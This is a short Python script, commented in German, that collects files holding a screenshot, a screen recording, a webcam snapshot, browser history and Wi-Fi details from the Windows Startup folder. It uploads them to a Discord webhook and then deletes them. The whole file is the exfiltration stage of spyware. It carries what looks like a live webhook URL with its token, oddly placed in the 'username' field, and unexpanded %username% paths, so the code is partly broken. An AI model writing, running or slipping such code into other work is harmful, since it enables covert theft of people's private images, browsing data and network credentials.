import requests
import os

# Webhook URL und Dateipfade
webhook_url = 'https://discord.com/api/webhooks/your_webhook_url'
files_path = {
    'screenshot.png': r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\screenshot.png',
    'screen_recording.mp4': r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\screen_recording.mp4',
    'webcam_snapshot.png': r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\webcam_snapshot.png',
    'browser_history.txt': r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\browser_history.txt',
    'wifi_info.txt': r'C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\wifi_info.txt'
}

# Dateien vorbereiten
files = {}
for name, path in files_path.items():
    if os.path.exists(path):
        if name.endswith(('.png', '.mp4')):
            files[name] = open(path, 'rb')
        else:
            files[name] = ('file', open(path, 'r', encoding='utf8'))

# Anfrage senden
response = requests.post(
    webhook_url,
    files=files,
    data={'username': 'https://discord.com/api/webhooks/1282629894081351743/HypHouPjcge_6Q8VOHrUn4wwoXtYW802B1sBYNOvsFwj9wcOkz7Q9IUyiZv3RC-wtM5P'}
)

# Überprüfen, ob die Anfrage erfolgreich war
if response.status_code == 204:
    print('Dateien erfolgreich gesendet.')
else:
    print(f'Fehler beim Senden der Dateien: {response.status_code}')

# Dateien löschen
for path in files_path.values():
    if os.path.exists(path):
        os.remove(path)
